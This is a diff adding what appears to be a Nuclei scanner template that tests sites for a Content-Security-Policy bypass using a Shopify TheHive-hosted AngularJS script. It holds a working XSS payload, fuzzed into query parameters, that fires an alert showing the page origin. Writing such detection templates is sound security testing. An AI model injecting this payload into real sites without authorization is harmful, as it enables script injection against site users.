@@ -1,0 +1,55 @@
+id: shopify-thehive-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Shopify TheHive
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,shopify-thehive
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "shopify.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: shopify_thehive_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://thehive.shopify.io/scripts/vendor.78eed977.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "shopify_thehive_csp_xss == true"
+# digest: 4a0a004730450220644f35f97f37e7f0c3a744dc68a7102f61422d2e2c889d1cc2dcd99981df635d022100eeeb7dae2bc427fd160f0f3538dc63880c7f7bf08d84530d0bddebd576d30a68:922c64590222798bb761d5b6d8e72950
